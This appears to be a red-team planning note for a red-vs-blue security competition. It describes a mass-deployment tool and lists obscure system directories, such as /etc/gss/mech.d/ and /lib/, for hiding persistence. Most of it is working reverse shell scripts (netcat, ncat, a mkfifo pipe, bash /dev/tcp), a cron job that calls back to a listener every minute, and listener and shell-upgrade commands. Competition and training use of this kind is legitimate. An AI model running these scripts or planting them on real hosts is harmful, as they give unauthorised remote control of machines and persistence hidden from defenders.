# Hi Team

This is the plan that I have for the deployment

To get the multissh up and running you need to run ```./setup_env.sh``` as the root user (actually switch to the root user) and do ```multissh-activate``` to get the venv up and running.

## Then we have a few tools and automations
- mass_deploy.sh is supposed to be the one run, and everything is one the box

This tool can deploy any tool folder and install script using the
### ./deploy_tool.sh <config.yaml> <local_tool_directory> <remote_dir> <install_command / script>
restrictions may apply*

Some possible directories:
- Any folder in /etc/, especially the boring looking ones like gss/mech.d/
- Any conf files they might not check
- /bins/ or /bin/ or /usr/share/ 
- /lib/ <--- This is where I will go
- some persistence will end up in /tmp/ as well but that's not too important

Things to change before comp start:
- Creds in CompPlacholder.yaml
- 


# Reverse Shell Scripts for Red vs Blue Competition

---

## 1. Netcat Reverse Shells

Different versions of `nc` support different flags, so here are variants:

```bash
#!/bin/bash
# red_team_revshell.sh
# EDUCATIONAL - Competition use only
# Blue team indicator: outbound connection on non-standard port, nc process

LHOST="192.168.1.100"  # Replace with your red team listener IP
LPORT="4444"

echo "[RED TEAM] Spawning reverse shell to $LHOST:$LPORT" >> /tmp/redteam_actions.log

# Variant 1: nc with -e (traditional/ncat)
nc -e /bin/bash $LHOST $LPORT

# Variant 2: nc without -e (OpenBSD netcat - most common on Ubuntu)
rm -f /tmp/rt_pipe; mkfifo /tmp/rt_pipe
cat /tmp/rt_pipe | /bin/bash -i 2>&1 | nc $LHOST $LPORT > /tmp/rt_pipe

# Variant 3: ncat (nmap's netcat, supports -e)
ncat -e /bin/bash $LHOST $LPORT
```

---

## 2. Bash Built-in (No Netcat Needed)

```bash
#!/bin/bash
# Uses only bash built-ins, no extra tools needed
LHOST="192.168.1.100"
LPORT="4444"

bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
```

---

## 3. Persistent Reverse Shell via Cron

```bash
#!/bin/bash
# Combines cron persistence with reverse shell callback
LHOST="192.168.1.100"
LPORT="4444"

# Drops a callback script
cat > /tmp/redteam_callback.sh << EOF
#!/bin/bash
# RED TEAM CALLBACK - competition artifact
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
EOF
chmod +x /tmp/redteam_callback.sh

# Runs every minute - very noisy and detectable
(crontab -l 2>/dev/null; echo "* * * * * /tmp/redteam_callback.sh # REDTEAM_SHELL") | crontab -
```

---

## 4. Your Listener (Red Team Side)

Run this on your attacking machine **before** executing the above:

```bash
# Basic nc listener
nc -lvnp 4444

# Or with ncat for more stability
ncat -lvnp 4444

# Upgrade your shell once connected
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then: Ctrl+Z -> stty raw -echo; fg -> reset
```
